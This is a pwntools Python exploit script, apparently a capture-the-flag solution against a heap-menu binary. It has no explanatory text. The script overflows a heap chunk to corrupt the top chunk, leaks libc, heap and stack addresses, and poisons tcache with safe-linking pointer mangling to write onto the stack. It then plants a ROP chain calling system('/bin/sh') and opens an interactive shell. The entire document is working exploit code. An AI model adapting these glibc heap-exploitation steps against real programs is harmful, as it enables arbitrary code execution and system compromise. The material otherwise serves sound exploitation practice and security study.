#!/usr/bin/python3

from pwn import *

exe = ELF('b', checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x0000000000401475

        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
# GDB()


def cr(idx, sz, pa):
    sla(b'Edit', str(1))
    sla(b'Size: ', str(sz))
    sla(b'Index: ', str(idx))
    sleep(0.1)
    sa(b'Buffer: ', pa)


def leak(idx):
    sla(b'Edit', str(2))
    sla(': ', str(idx))


def edit(idx, pa):
    sla(b'Edit', str(3))
    sla(': ', str(idx))
    sa(': ', pa)


cr(0, 0x10, b'wan')
edit(0, b'wan'.ljust(0x10) + flat(0, 0xd51))
cr(1, 0xe00+0x180, b'\0'*0xe00 + b'wanwan')
cr(2, 0xd20, b'\x01')
leak(2)
libc.address = u64(p.recv(6) + b'\0\0') - 0x1d3c01
info("libc.address: " + hex(libc.address))

edit(1, b'a'*0xf80 + flat(0, 0x71))
cr(3, 0xff0-0x70, b'wanwan')
edit(3, b'a'.ljust(0xff0-0x70) + flat(0, 0x71))
cr(4, 0xff0-0x70, b'wanwan')
edit(1, b'a'*(0xff0-0x70+0x10))
leak(1)
p.recvuntil(b'a'*(0xe00+0x180+0x10))
heap = (u64(p.recvline()[:-1].ljust(8, b'\0')) << 12) - 0x21000
info("heap: " + hex(heap))


edit(3, b'a'*(0xff0-0x70) + flat(0, 0x51,
     (libc.sym.environ-0x10) ^ (heap+0x43fa0 >> 12)))
cr(0, 0x40, b'wan')
cr(0, 0x40, b'a'*0x10)
leak(0)
p.recvuntil(b'a'*0x10)
stack = u64(p.recvline()[:-1] + b'\0\0')
info("stack " + hex(stack))
target = stack - 0x120

edit(4, b'a'*(0xff0-0x70) + flat(0, 0x71))
cr(5, 0xff0-0x70, b'wanwan')
edit(5, b'a'*(0xff0-0x70) + flat(0, 0x71))
cr(6, 0xff0-0x70, b'wanwan')
edit(5, b'a'*(0xff0-0x70) + flat(0, 0x51,
                                 (target-8) ^ (heap+0x87fa0 >> 12)))
cr(0, 0x40, b'wan')
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))
cr(0, 0x40, b'a'*8 + p64(rop.find_gadget(['ret'])[0]) + bytes(rop))

p.interactive()
